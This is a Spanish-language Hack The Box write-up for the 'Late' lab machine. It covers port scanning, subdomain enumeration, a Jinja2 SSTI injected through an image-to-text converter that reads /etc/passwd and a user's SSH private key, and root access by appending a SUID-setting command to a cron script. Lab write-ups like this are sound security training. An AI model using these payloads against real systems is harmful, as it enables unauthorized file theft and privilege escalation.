---
layout: single
title: Late - Hack The Box
excerpt: ""
date: 2023-11-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-late/late_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - subdomain enumeration

---

# PortScan
________
```
# Nmap 7.93 scan initiated Mon Nov 27 17:44:00 2023 as: nmap -sCV -p22,80 -oN targeted 10.10.11.156
Nmap scan report for 10.10.11.156
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 025e290ea3af4e729da4fe0dcb5d8307 (RSA)
|   256 41e1fe03a5c797c4d51677f3410ce9fb (ECDSA)
|_  256 28394698171e461a1ea1ab3b9a577048 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 27 17:44:10 2023 -- 1 IP address (1 host up) scanned in 9.80 seconds
```

# WebSite
____

![](/assets/images/htb-writeup-late/Pasted image 20231127182726.png)

Enumerando posibles directorios & viendo el código fuente no encontré nada interesante, así que decidí enumerar posibles **sub-dominios** para éste dominio.

```bash
gobuster vhost -u http://late.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -k
===============================================================
de
===============================================================
Found: images.late.htb (Status: 200) [Size: 2187]
```

descubriendo así un sub-dominio "**images.late.htb**", hacemos virtual hosting metiendo éste en el "**/etc/hosts**", una vez tengamos esto podemos ingresar al sub-dominio, encontrándonos con ésto.

![](/assets/images/htb-writeup-late/Pasted image 20231127183209.png)

Viendo qué podemos convertir imágenes a texto, esto con el framework "**Flask**" qué está escrito en python.

Creamos una imagen con un texto básico ésto con la ayuda de "**libreoffice**" y "**scrot**" para tomar la captura.

1. Abrimos el "**libreoffice**" y ponemos un texto para tomarle captura.
![](/assets/images/htb-writeup-late/Pasted image 20231127183421.png)

2. Corremos el "**scrot**" con un tiempo de espera para que nos de chance a volver al **"libreoffice"** y tomar la captura.
```bash
sleep 3; scrot -s capture.png
```

y tendríamos la captura del texto en "**libreoffice**" en capture.png.
![](/assets/images/htb-writeup-late/Pasted image 20231127183606.png)

Procedemos a subir ésta imagen a ver sí esta fuente logra interpretarla correctamente.

![](/assets/images/htb-writeup-late/Pasted image 20231127183908.png)

Vemos lo está interpretando, como está corriendo un **Flask**, se me ocurre probar un **SSTI** con una operación básica de multiplicación a ver si logra interpretarlo...

1. Ponemos una operación básica en el "**libreoffice**"
![](/assets/images/htb-writeup-late/Pasted image 20231127184101.png)

2. Tomamos la captura con "scrot"
```bash
sleep 3; scrot -s capture.png
```


Una vez con la captura, la subimos para ver los resultados...

![](/assets/images/htb-writeup-late/Pasted image 20231127184356.png)
Estamos logrando llevar a cabo el **SSTI**, así que se me ocurre aprovecharnos de esto para llevar a cabo una lectura de archivos de la máquina y ver el "**/etc/passwd**".
![](/assets/images/htb-writeup-late/Pasted image 20231127193325.png)
```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Así que con "**scrot**" tomo una captura de ésto y la subo, viendo como resultado el contenido del "**/etc/passwd**".

como vemos en el "**result.txt"**
![](/assets/images/htb-writeup-late/Pasted image 20231127194153.png)

Viendo un usuario válido del sistema, por lo qué se me ocurre ver si está la clave privada **SSH** expuesta para éste usuario, en **"/home/svc_acc/.ssh/id_rsa"**
![](/assets/images/htb-writeup-late/Pasted image 20231127195153.png)

vemos qué está expuesta, así que procedemos a conectarnos con **SSH** desde nuestra máquina, pero primero debemos quitarles las etiquetas "**< p >**"
para posterior a ello conectarnos tal que así:
```bash
mv results.txt id_rsa
ssh -i id_rsa svc_acc@10.10.11.156

```

![](/assets/images/htb-writeup-late/Pasted image 20231127195853.png)


# Escalada de Privilegios
___

con el binario de [pspy64](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1), no los enviamos a la máquina víctima desde un servidor python y le damos permisos de ejecución en la máquina víctima.
![](/assets/images/htb-writeup-late/Pasted image 20231127202232.png)

Vemos que **root**, está asignándole un atributo -**"a"** al script "**ssh-alert.sh**".

![](/assets/images/htb-writeup-late/Pasted image 20231127202450.png)

Vemos en los permisos que podemos editarlo, se me ocurre de primera darle permisos **SUID** a la bash ya que ROOT lo ejecuta.. pero nos deniega el permisos, esto por el atributo **"-a"**, que es "**append-only**", es decir, sólo podemos modificar el archivo metiéndole contenido desde append, es decir **>>**, sabiendo ésto.

1. en "**tmp**", creamos un archivo con contenido dentro que de permisos SUID a la Bash.
```
nano privesc.txt
```
2. Contenido del "**privesc.txt**"
```bash
chmod u+s /bin/bash
```

3. metemos el contenido de "privesc.txt" a "ssh-alert.sh":
```bash
cat privesc.txt >> /usr/local/sbin/ssh-alert.sh
```

4. Esperamos a qué se vuelva ejecutar la tarea CRON y ya la bash tendría SUID.
![](/assets/images/htb-writeup-late/Pasted image 20231127203036.png)

